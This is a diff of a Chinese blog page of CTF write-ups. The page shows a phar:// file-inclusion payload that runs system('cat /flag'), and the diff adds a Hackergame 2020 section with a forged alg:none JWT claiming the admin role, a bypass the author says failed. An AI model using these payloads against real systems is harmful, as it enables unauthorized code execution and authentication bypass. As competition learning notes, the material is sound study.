@@ -302,7 +302,7 @@
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-10-25T14:05:37.000Z"><a href="/2020/10/25/CTF%E7%AC%94%E8%AE%B0/%E5%90%84%E7%A7%8DCTF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WriteUp%F0%9F%98%8A/">2020-10-25</a></time>
+            <time class="pink-link-context" datetime="2020-10-25T13:09:36.577Z"><a href="/2020/10/25/CTF%E7%AC%94%E8%AE%B0/%E5%90%84%E7%A7%8DCTF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WriteUp%F0%9F%98%8A/">2020-10-25</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -318,7 +318,7 @@
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E5%90%84%E7%A7%8DCTF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WriteUp%F0%9F%98%8A"><span class="section table-of-contents-text">各种CTF练习平台WriteUp😊</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81BMZCTF-phar"><span class="section table-of-contents-text">一、BMZCTF:phar??</span></a></li></ol></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E5%90%84%E7%A7%8DCTF%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WriteUp%F0%9F%98%8A"><span class="section table-of-contents-text">各种CTF练习平台WriteUp😊</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81BMZCTF-phar"><span class="section table-of-contents-text">一、BMZCTF:phar??</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81%E6%99%AE%E9%80%9A%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%99%A8"><span class="section table-of-contents-text">二、普通的身份认证器</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81HackerGame2020%E2%80%94%E2%80%94%E8%B6%85%E7%AE%80%E6%98%93%E7%9A%84%E7%BD%91%E7%9B%98%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="section table-of-contents-text">三、HackerGame2020——超简易的网盘服务器</span></a></li></ol></li></ol></li></ol>
 </div>
 
 
@@ -338,6 +338,22 @@
 <p>Payload：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.bmzclub.cn:20188/include.php?file=phar://upload/my2.jpg/index</span><br><span class="line"></span><br><span class="line">POST: zjc=system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
+<h3 id="二、普通的身份认证器"><a href="#二、普通的身份认证器" class="headerlink" title="二、普通的身份认证器"></a>二、普通的身份认证器</h3><blockquote>
+<p>中国科学技术大学第七届信息安全大赛</p>
+</blockquote>
+<p>​    此题怀疑是JWT伪造，题目解释如下：</p>
+<p>近日，小 T 接手了某个老旧 Python 网站的重构工作。接手之后，他把原先的 requirements.txt 复制到了新项目下，更换了后端框架，照着框架文档魔改了身份认证部分的内容，写出了一个测试用的原型。看起来一切都很正常，只是他似乎没有仔细检查每一项依赖的版本。</p>
+<p>​    总觉得有哪里不对，但奈何python网站只了解flask和Django，尝试Django文档中找配置身份认证的内容，没有找到。</p>
+<p>1、今天看学校Dozer社团大佬们的Wiki，学习到了<a target="_blank" rel="noopener" href="http://wiki.dozerjit.club:8086/JWT%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">JWT相关的攻击方法</a>。</p>
+<p>​    分别是1、None签名绕过检测 2、 RSA-&gt;HSA算法转换</p>
+<p>​    2的使用条件需要知道公钥，这个我不知道呀。试试1吧！通过脚本构造Payload如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6IjE2MDQ0OTg4NTYifQ.</span><br><span class="line"></span><br><span class="line"><span class="comment">##    HEADER:&#123;</span></span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">##    PAYLOAD:&#123;</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;1604498856&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    失败呀！再想想其它思路吧。</p>
+<h3 id="三、HackerGame2020——超简易的网盘服务器"><a href="#三、HackerGame2020——超简易的网盘服务器" class="headerlink" title="三、HackerGame2020——超简易的网盘服务器"></a>三、HackerGame2020——超简易的网盘服务器</h3><blockquote>
+<p>中国科学技术大学第七届信息安全大赛</p>
+</blockquote>
+<p>​    这里学习到了h5ai这一文件服务器模板，有时间可以自己搭建一个云盘服务器。另外对HTTP Authorization 的 Basic Auth有了基础了解。</p>
 
                 
 <p class="pink-link-context">
